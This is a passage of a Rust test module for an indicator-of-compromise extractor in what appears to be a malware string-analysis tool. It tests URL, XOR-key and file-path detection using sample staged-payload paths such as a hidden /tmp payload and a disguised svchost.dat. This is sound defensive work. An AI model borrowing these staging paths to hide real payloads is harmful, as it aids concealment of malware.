            string(
                "http://203.0.113.7/test",
                Some(StringKind::Url),
                StringMethod::RawScan,
            ),
            string(
                "http://45.0.32.156/test",
                Some(StringKind::Url),
                StringMethod::RawScan,
            ),
            string("not a scheme ://example.com", None, StringMethod::RawScan),
            string(
                "http://-bad.example.com/",
                Some(StringKind::Url),
                StringMethod::RawScan,
            ),
            string(
                "http://example.unknown/",
                Some(StringKind::Url),
                StringMethod::RawScan,
            ),
        ];
        assert!(extract_iocs(&values).is_empty());
    }

    #[test]
    fn occurrence_details_are_bounded_but_count_is_complete() {
        let values: Vec<_> = (0..20)
            .map(|_| {
                string(
                    "https://example.com/",
                    Some(StringKind::Url),
                    StringMethod::RawScan,
                )
            })
            .collect();
        let got = extract_iocs(&values);
        assert_eq!(got[0].count, 20);
        assert_eq!(got[0].occurrences.len(), MAX_IOC_OCCURRENCES);
    }

    #[test]
    fn structurally_typed_xor_keys_are_lossless_and_deduplicated() {
        let values = [
            string("secret", Some(StringKind::XorKey), StringMethod::RawScan),
            string(
                "0x736563726574",
                Some(StringKind::XorKey),
                StringMethod::XorStackPair,
            ),
        ];
        let got = extract_iocs(&values);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].kind, IocKind::Key);
        assert_eq!(got[0].value, encode_key_material(b"secret"));
        assert_eq!(decode_key_material(&got[0].value), Some(b"secret".to_vec()));
        assert_eq!(got[0].count, 2);
        assert_eq!(
            got[0].key,
            Some(KeyMetadata {
                algorithms: vec![KeyAlgorithm::Xor],
                bytes: 6,
            })
        );

        let json = serde_json::to_string(&got).unwrap();
        assert!(json.contains(r#""value":"base64url:c2VjcmV0""#));
        assert!(
            !json.contains("secret"),
            "binary key material was not JSON-safe encoded"
        );
        assert!(
            !json.contains("736563726574"),
            "hex key material leaked into JSON"
        );
    }

    #[test]
    fn key_material_encoding_is_canonical() {
        let binary = [0xfb, 0xff, 0x00, 0x7f];
        let encoded = encode_key_material(&binary);
        assert_eq!(encoded, "base64url:-_8Afw");
        assert_eq!(decode_key_material(&encoded), Some(binary.to_vec()));
        assert_eq!(decode_key_material("base64url:"), None);
        assert_eq!(decode_key_material("base64url:c2VjcmV0="), None);
        assert_eq!(decode_key_material("base64url:AB"), None);
        assert_eq!(decode_key_material("sha256:c2VjcmV0"), None);
    }

    #[test]
    fn key_shape_without_structural_evidence_is_not_emitted() {
        let values = [
            string(
                "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf",
                None,
                StringMethod::RawScan,
            ),
            string(
                "MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=",
                Some(StringKind::Base64),
                StringMethod::RawScan,
            ),
        ];
        assert!(extract_iocs(&values).is_empty());
    }

    #[test]
    fn path_canonicalization_is_absolute_minimal_and_conservative() {
        assert_eq!(
            canonicalize_ioc_path("/tmp/.stage-9f3a/payload.bin"),
            Some("/tmp/.stage-9f3a/payload.bin".to_string())
        );
        assert_eq!(
            canonicalize_ioc_path(r"c:\Users\Public\svchost.dat"),
            Some(r"C:\Users\Public\svchost.dat".to_string())
        );
        assert_eq!(
            canonicalize_ioc_path(r"\\host\share\stage\payload.dat"),
            Some(r"\\host\share\stage\payload.dat".to_string())
        );

        for rejected in [
            "/bin/sh",
            "/usr/bin/python3",
            r"C:\Windows\System32\cmd.exe",
            "/build/project/src/main.rs",
            "/opt/homebrew/Cellar/go/1.25.6/libexec/src/runtime/runtime-gdb.py",
            "./relative/payload.bin",
            "/Applications",
            "/CBx",
            "/tmp/stage/",
            "/tmp/$USER/payload",
            "/tmp/payload-%s",
            "/tmp/*.dat",
            "/dev/urandom7K'UmU",
            "/dev/uraL9",
            "/etc/hosts",
            "/proc/sys/kernel/hostname",
            "/root/go/go1.16.6",
            "/usr/share/mime/globs2",
            "/Users/cosmanking/.cargo/registry/src/index.crates.io/hash/src/lib.rsmessage",
            "/Drivers/etc/hosts",
            "/System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa",
            "/usr/lib/libSystem.B.dylib",
            "/root/openssl-prefix/ssl/cert.pem",
            "/http://example.com/cert.crl",
        ] {
            assert_eq!(
                canonicalize_ioc_path(rejected),
                None,
                "unexpected path IOC: {rejected}"
            );
        }
    }

    #[test]
    fn typed_full_paths_deduplicate_but_source_paths_and_common_tools_do_not_emit() {
        let values = [
            string(
                "/tmp/.stage-9f3a/payload.bin",
                Some(StringKind::SuspiciousPath),
                StringMethod::RawScan,
            ),
            string(
                "/tmp/.stage-9f3a/payload.bin",
                Some(StringKind::Path),
                StringMethod::Base64Decode,
            ),
            string(
                "/home/builder/src/main.rs",
                Some(StringKind::FilePath),
                StringMethod::PclntabSymbol,
            ),
            string("/bin/bash", Some(StringKind::Path), StringMethod::RawScan),
        ];
        let got = extract_iocs(&values);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].kind, IocKind::Path);
        assert_eq!(got[0].value, "/tmp/.stage-9f3a/payload.bin");
        assert_eq!(got[0].count, 2);
        assert!(
            got[0]
                .occurrences
                .iter()
                .any(|occurrence| occurrence.method == StringMethod::Base64Decode)
        );
    }
}
